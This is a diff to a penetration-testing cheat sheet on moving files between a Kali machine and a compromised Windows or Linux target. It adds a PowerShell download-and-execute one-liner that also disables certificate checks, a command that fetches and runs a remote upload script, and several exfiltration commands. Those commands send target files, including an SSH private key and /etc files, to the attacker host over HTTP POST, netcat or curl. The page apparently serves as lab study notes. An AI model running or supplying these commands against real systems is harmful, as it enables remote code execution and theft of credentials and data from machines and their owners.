@@ -32,8 +32,38 @@ nav_order: 17
 9. TFTP (Windows XP/2003 and earlier default).\
    Kali: `atftpd --daemon --port 69 /tmp/tftp`, then `/etc/init.d/atftpd restart`\
    Victim: `tftp -i kaliIP GET/PUT file`
+10. (Windows)Powershell to download:\
+    `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`\
+    If got SSL/TLS issue, use:\
+    `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
 
 ## Upload
 1. Start Apache server (`sudo service apache2 start`), and then use `powershell (New-Object System.Net.WebClient).UploadFile('http://IP/upload321.php', 'important.docx')` to upload.
 2. `scp -P port user@SRC_HOST:file1 user@DEST_HOST:file2`\
    (if copy to localhost no need put localhost, just use full path like /home/xxx/yyy)
+3. (Windows)Do an upload server in Kali:\
+   `pip3 install uploadserver`\
+   Serve it on Kali:\
+   `python3 -m uploadserver`\
+   On target machine:\
+   `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`\
+   `Invoke-FileUpload -Uri http://KALIIP:8000/upload -File C:\testfile`
+4. (Windows)Use nc to listen to the incoming request on Kali:\
+   `nc -lvnp 8000`\
+   Send these powershell on target:\
+   `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\testfile' -Encoding Byte))`
+   `Invoke-WebRequest -Uri http://KALIIP:8000/ -Method POST -Body $b64`
+5. (Linux)Get the base64 content on target:\
+   `cat id_rsa |base64 -w 0;echo`\
+   Decode it on our Kali:\
+   `echo -n 'LS0t...' | base64 -d > id_rsa`
+6. (Linux)Use uploadserver:\
+   `pip3 install uploadserver`\
+   Create certificate:\
+   `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
+   Create a new folder for the certificate:\
+   `mkdir https`\
+   Use the certificate to start uploadserver:\
+   `sudo python3 -m uploadserver 443 --server-certificate ~/https/server.pem`\
+   From our target:\
+   `curl -X POST https://KALIIP/upload -F 'files=@/home/testfile1' -F 'files=@/etc/testfile2' --insecure`
